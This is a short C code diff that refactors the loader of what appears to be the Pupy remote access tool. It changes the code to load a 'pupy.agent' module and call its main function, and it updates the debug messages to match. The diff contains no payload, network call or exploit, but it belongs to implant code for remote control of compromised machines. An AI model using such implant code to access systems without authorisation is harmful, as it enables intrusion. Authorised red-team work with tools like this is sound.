@@ -1014,7 +1014,12 @@ void run_pupy() {
     */
 
     dprint("Loading pupy\n");
-    pupy = py_module_from_stdlib(py_stdlib, "pupy", 1);
+
+    if (!py_module_from_stdlib(py_stdlib, "pupy", 1))
+        goto lbExit4;
+
+    pupy = py_module_from_stdlib(py_stdlib, "pupy.agent", 1);
+
     if (!pupy)
         goto lbExit4;
 
@@ -1022,7 +1027,7 @@ void run_pupy() {
     py_main = PyDict_GetItemString(pupy_dict, "main");
 
     if (!py_main) {
-        dprint("pupy.main not found\n");
+        dprint("pupy.agent.main not found\n");
         goto lbExit3;
     }
 
@@ -1033,7 +1038,7 @@ void run_pupy() {
 #endif
 
     dprint(
-        "Call pupy.main: %p(%p, %p, %p)\n",
+        "Call pupy.agent.main: %p(%p, %p, %p)\n",
         py_main, Py_None, py_debug, py_config
     );
 
